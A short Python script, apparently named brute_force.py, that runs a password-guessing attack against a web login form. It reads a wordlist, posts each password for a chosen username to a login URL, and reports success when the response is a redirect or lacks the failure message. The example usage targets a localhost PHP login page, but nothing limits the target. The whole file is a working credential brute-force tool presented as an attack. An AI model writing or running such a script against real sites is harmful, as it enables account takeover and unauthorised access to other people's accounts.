import requests 

import sys 

def brute_force_login(url, username, password_file): 

    # Initialize session to persist cookies 

    session = requests.Session() 
 

    # Open the password file 

    try: 

        with open(password_file, 'r') as file: 

            passwords = [line.strip() for line in file if line.strip()] 

    except FileNotFoundError: 

        print(f"Error: Password file '{password_file}' not found.") 

        return 

    except Exception as e: 

        print(f"Error reading password file: {e}") 

        return 

 

    # Iterate through passwords 

    for password in passwords: 

        # Prepare POST data 

        data = { 

            'username': username, 

            'password': password 

        } 

 

        print(f"\nTrying password: {password}") 

 

        # Send POST request 

        try: 

            response = session.post(url, data=data, timeout=5) 

            response_text = response.text.strip() 

 

            # Check for rate-limiting 

            if "Too many attempts" in response_text: 

                print("Rate limit reached. Please wait and try again later.") 

                return 

 

            # Check for success 

            if response.status_code == 302 or "Invalid username or password" not in response_text: 

                print(f"\nSuccess! Password is: {password}") 

                return 

            else: 

                print("Failed: Invalid credentials.") 

 

        except requests.RequestException as e: 

            print(f"Request failed: {e}") 

            continue 

 

    print("\nPassword not found in the list.") 

 

 

# Check command-line arguments 

if len(sys.argv) != 4: 

    print("Usage: python brute_force.py <url> <username> <password_file>") 

    print("Example: python brute_force.py http://localhost/process_login.php admin passwords.txt") 

    sys.exit(1) 

 

url = sys.argv[1] 

username = sys.argv[2] 

password_file = sys.argv[3] 

 

print("Starting brute-force attack on {url} with username:",username) 

brute_force_login(url, username, password_file) 